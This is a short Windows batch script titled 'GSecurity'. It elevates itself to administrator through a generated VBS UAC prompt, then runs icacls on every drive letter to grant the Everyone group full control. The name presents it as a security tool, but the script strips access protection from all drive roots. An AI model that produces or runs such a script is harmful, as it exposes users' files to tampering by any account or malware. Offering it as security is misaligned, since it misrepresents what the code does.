@echo off
title GSecurity & color 0b

:: elevation
set "params=%*"
cd /d "%~dp0" && (
    if exist "%temp%\getadmin.vbs" del "%temp%\getadmin.vbs"
) && (
    fsutil dirty query %systemdrive% 1>nul 2>nul || (
        echo Set UAC = CreateObject^("Shell.Application"^) : UAC.ShellExecute "cmd.exe", "/k cd ""%~sdp0"" && %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs"
        "%temp%\getadmin.vbs" && exit /B
    )
)

:: job
for %%d in (a b c d e f g h i j k l m n o p q r s t u v w x y z) do (
    icacls %%d: /grant Everyone:F
)

:: exit
exit
